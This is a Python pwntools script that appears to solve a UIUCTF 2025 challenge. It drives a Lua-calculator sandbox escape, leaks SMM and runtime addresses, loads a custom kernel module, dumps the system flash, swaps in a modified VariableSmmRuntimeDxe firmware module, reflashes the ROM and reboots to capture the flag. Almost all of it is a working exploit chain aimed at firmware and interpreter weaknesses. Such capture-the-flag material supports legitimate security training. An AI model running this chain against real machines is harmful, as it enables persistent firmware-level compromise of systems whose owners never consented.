#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2022-2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes
import base64
import gzip


def printraw(c):
    print(c.decode(), end='')


def handle_pow(r):
    printraw(r.recvuntil(b'python3 '))
    printraw(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    printraw(r.recvuntil(b'Correct\n'))


r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
printraw(r.recvuntil(b'== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)


printraw(r.recvuntil(b'Calculator (Lua 5.2)'))
r.send(b'\x1b[B\n')

printraw(r.recvuntil(b'\n> '))

with open('/home/user/exploit.min.lua', 'rb') as f:
    r.send(f.read())

with open('/home/user/lua_payload', 'rb') as f:
    r.send(b'p = ""\n')
    payload = f.read()

    for i in range(0, len(payload), 10):
        chunk = ''.join(f'\\{c}' for c in payload[i:i+10])
        r.send(f'p=p.."{chunk}"\n'.encode())

r.send(b'''\
cpayload = make_CClosure(addr_of(p) + 24)
cpayload()
os.exit()
''')

printraw(r.recvuntil(b'PiSmmIpl: '))
printraw(line := r.recvline())
PiSmmIpl = int(line.decode().strip(), 16)

printraw(r.recvuntil(b'RtData: '))
printraw(line := r.recvline())
RtData = int(line.decode().strip(), 16)

printraw(r.recvuntil(b'Alpine Linux edge'))
r.send(b'\n')

printraw(r.recvuntil(b'uiuctf-2025:/root$ '))
r.send(b"base64 -d << 'EOF' | zcat > exploit.ko\n")
with open('/home/user/exploit.ko', 'rb') as f:
    r.send(base64.b64encode(gzip.compress(f.read())))
r.send(b'\nEOF\n')

printraw(r.recvuntil(b'uiuctf-2025:/root$ '))
r.send(f'insmod exploit.ko PiSmmIplPhys={PiSmmIpl} RtDataPhys={RtData}\n'.encode())

printraw(r.recvuntil(b'VM suspended. Press enter to resume...'))
r.send(b'\n')

printraw(r.recvuntil(b'uiuctf-2025:/root$ '))
r.send(b'dd if=/dev/pflash of=code.rom bs=4096 skip=132 status=progress\n')

printraw(r.recvuntil(b'uiuctf-2025:/root$ '))
r.send(b"base64 -d << 'EOF' | zcat > VariableSmmRuntimeDxe.ffs\n")
with open('/home/user/VariableSmmRuntimeDxe.ffs', 'rb') as f:
    r.send(base64.b64encode(gzip.compress(f.read())))
r.send(b'\nEOF\n')

printraw(r.recvuntil(b'uiuctf-2025:/root$ '))
r.send(b'./UEFIReplace code.rom 9F7DCADE-11EA-448A-A46F-76E003657DD1 7 '
       b'VariableSmmRuntimeDxe.ffs -o code_new.rom -asis\n')

printraw(r.recvuntil(b'uiuctf-2025:/root$ '))
r.send(b"base64 -d << 'EOF' | zcat > flashtool\n")
with open('/home/user/flashtool', 'rb') as f:
    r.send(base64.b64encode(gzip.compress(f.read())))
r.send(b'\nEOF\n')

printraw(r.recvuntil(b'uiuctf-2025:/root$ '))
r.send(b'chmod a+x flashtool\n')

printraw(r.recvuntil(b'uiuctf-2025:/root$ '))
r.send(b'./flashtool\n')

printraw(r.recvuntil(b'uiuctf-2025:/root$ '))
r.send(b'reboot -f\n')

printraw(r.recvuntil((b'CTF{', b'uiuctf{')))
printraw(r.recvuntil((b'}')))

exit(0)
